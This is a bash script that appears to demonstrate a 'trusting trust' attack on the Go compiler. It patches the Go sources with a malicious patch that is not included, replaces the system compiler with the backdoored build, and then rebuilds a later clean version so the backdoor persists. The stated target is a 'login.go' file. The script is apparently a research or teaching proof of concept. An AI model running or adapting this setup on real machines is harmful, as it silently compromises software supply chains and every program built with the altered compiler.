#!/bin/bash

echo -e "\n\n****************************************************"
echo -e "*               INSTALLING MALICIOUS COMPILER       *"
echo -e "****************************************************\n\n"

echo -e ">> Retrieving a clean Go compiler version ${GO_VERSION_BOOTSTRAP}..."

# install benign Go compiler
echo -e "\n---------------------------------------------------------------"
if ! wget https://go.dev/dl/go${GO_VERSION_BOOTSTRAP}.linux-amd64.tar.gz; then
    echo ">> Failed to download the Go compiler. Aborting."
    exit 1
fi
rm -rf /usr/local/go
if ! tar -C /usr/local -xzf go${GO_VERSION_BOOTSTRAP}.linux-amd64.tar.gz; then
    echo ">> Failed to extract the Go compiler. Aborting."
    exit 1
fi
rm go${GO_VERSION_BOOTSTRAP}.linux-amd64.tar.gz
echo -e "---------------------------------------------------------------\n"

export PATH=$PATH:/usr/local/go/bin

if ! command -v go &> /dev/null
then
    echo ">> Go installed failed. Aborting."
    exit 1
fi

echo -e "\n>> Retrieving Go sources for version ${GO_VERSION_ATTACK_1} to compromise..."

# download new version of Go compiler sources
echo -e "\n---------------------------------------------------------------"
mkdir -p /exploit
cd /exploit
if ! wget https://go.dev/dl/go${GO_VERSION_ATTACK_1}.src.tar.gz; then
    echo ">> Failed to download the Go compiler sources for version ${GO_VERSION_ATTACK_1}. Aborting."
    exit 1
fi
if ! tar -xzf go${GO_VERSION_ATTACK_1}.src.tar.gz; then
    echo ">> Failed to extract the Go compiler sources for version ${GO_VERSION_ATTACK_1}. Aborting."
    exit 1
fi
rm go${GO_VERSION_ATTACK_1}.src.tar.gz
echo -e "---------------------------------------------------------------\n"

# apply malicious patch to Go sources
echo -e "\n>> Patching Go compiler sources with malicious patch...\n"
cd /exploit/go

echo -e "\n---------------------------------------------------------------"
if ! patch -p1 < ../malicious.patch; then
    echo ">> Failed to apply the malicious patch to the Go sources. Aborting."
    exit 1
fi
echo -e "---------------------------------------------------------------\n"

echo -e "\n>> Malicious patch applied to the compiler sources. Building malicious compiler.\n"

# compile malicious Go sources with clean bootstrap
cd /exploit/go/src
echo -e "\n---------------------------------------------------------------"
if ! ./make.bash; then
    echo ">> Failed to compile the malicious Go sources. Aborting."
    exit 1
fi
echo -e "---------------------------------------------------------------\n"

if [ ! -f /exploit/go/bin/go ]; then
    echo ">> Go binary not found. Aborting."
    exit 1
fi

echo -e "\n>> Malicious Go compiler binary built successfully.\n"

# replace the clean Go compiler with the malicious one
rm -rf /usr/local/go/
mv /exploit/go/ /usr/local/go

echo -e "\n>> Malicious Go compiler version ${GO_VERSION_ATTACK_1} installed.\n"


echo -e "\n>> We now show persistence across compiler upgrades by compiling new clean compiler sources from malicious binary.\n"
echo -e "\n>> Retrieving Go sources for version ${GO_VERSION_ATTACK_2}...\n"

# use the malicious Go compiler to compile clean Go sources, resulting in a malicious compiler again
cd /exploit
rm -rf go go${GO_VERSION_ATTACK_1}.src.tar.gz
echo -e "\n---------------------------------------------------------------"
if ! wget https://go.dev/dl/go${GO_VERSION_ATTACK_2}.src.tar.gz; then
    echo ">> Failed to download the second set of Go compiler sources for attack. Aborting."
    exit 1
fi
if ! tar -xzf go${GO_VERSION_ATTACK_2}.src.tar.gz; then
    echo ">> Failed to extract the second set of Go compiler sources for attack. Aborting."
    exit 1
fi
rm go${GO_VERSION_ATTACK_2}.src.tar.gz
echo -e "---------------------------------------------------------------\n"


echo -e "\n>> Building new Go compiler...\n"
cd /exploit/go/src
echo -e "\n---------------------------------------------------------------"
if ! ./make.bash; then
    echo ">> Failed to compile the second malicious Go sources. Aborting."
    exit 1
fi
echo -e "---------------------------------------------------------------\n"


if [ ! -f /exploit/go/bin/go ]; then
    echo ">> Go binary not found. Aborting."
    exit 1
fi

echo -e ">> Second malicious Go compiler compiled.\n"

# replace the first malicious Go compiler with the new malicious compiler (showing persitence across versions)
rm -rf /usr/local/go/
mv /exploit/go/ /usr/local/go

echo -e ">> Second upgraded malicious compiler installed, achieving persistence.\n"
echo -e ">> This compiler can now be used to attack the specific 'login.go' file.\n"